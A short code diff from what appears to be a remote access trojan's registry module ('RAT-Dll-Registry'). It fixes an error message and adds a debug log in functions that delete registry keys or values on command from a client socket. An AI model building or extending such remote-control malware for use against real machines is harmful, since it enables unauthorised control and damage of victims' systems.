@@ -298,7 +298,7 @@ INT handleRegDelete(__in SOCKET clientSock)
 	status = performRegDelete(isKey, keyPathBuffer, valueBuffer);
 	if (status != SUCCESS)
 	{
-		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failure recevied from performRegRead %d\n", status);
+		sprintf_s(msgBuf, "RAT-Dll-Registry::handleRegDelete - Failure recevied from performRegDelete %d\n", status);
 		OutputDebugStringA(msgBuf);
 		goto cleanup;
 	}
@@ -421,7 +421,9 @@ INT performRegDelete(__in bool isKey, __in char* keyPath, __in char* value)
 			sprintf_s(msgBuf, "RAT-Dll-Registry::performRegDelete - Failure recevied from RegDeleteValueA %d\n", status);
 			OutputDebugStringA(msgBuf);
 			goto cleanup;
-		}		
+		}	
+
+		OutputDebugStringA("RAT-Dll-Registry::performRegDelete - Deleted value!\n");
 	}
 
 	status = SUCCESS;
